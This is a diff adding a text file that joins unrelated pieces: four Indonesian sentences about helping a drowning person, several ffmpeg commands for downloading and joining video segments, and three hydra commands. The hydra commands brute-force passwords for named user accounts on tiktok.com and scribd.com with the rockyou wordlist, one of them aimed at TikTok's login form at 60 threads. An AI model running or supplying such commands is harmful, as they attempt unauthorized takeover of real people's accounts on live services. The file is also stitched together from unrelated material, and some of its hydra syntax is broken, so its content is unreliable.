@@ -1,0 +1,18 @@
+Ketika seseorang sedang tenggelam, itu bukanlah waktu yang tepat untuk mengajarinya cara berenang.
+Pada saat napasnya tersengal dan matanya dipenuhi panik, yang ia butuhkan bukan teori, melainkan tangan yang meraih.
+Hidup sering menempatkan manusia pada titik rapuh semacam itu, di mana pikiran kehilangan kejernihan dan logika tak lagi mampu bekerja utuh.
+Dalam krisis, nasihat yang paling benar sekalipun bisa berubah menjadi beban.
+
+ffmpeg -i "VIDEO_URL" -c copy output.mp4
+ffmpeg -i "$PLAYLIST_FILE" -c copy 'out.mp4'
+ffmpeg -i "$PLAYLIST_FILE" -c copy -f segment -segment_list out.list 'out%03d.ts'
+for f in ./*.ts; do echo "file '$f'" >> segment_files.txt ; done
+ffmpeg -f concat -safe 0 -i segment_files.txt -c copy out.mp4
+
+hydra -l mansz1981 -P /usr/share/wordlists/rockyou.txt -t http tiktok.com -s 8080 -o result.txt
+
+hydra -f -l ahmadmaulidin613 -P /usr/share/wordlists/rockyou.txt tiktok.com http-post-form "/login/phone-or-email/email:username=^USER^&password=^PASS^:F=Username or password doesn't match our records. Try again." -t 60
+
+
+hydra -l ahmadmaulidin613 -P /usr/share/wordlists/rockyou.txt -t http scribd.com -s 8080 -o result.txt
+
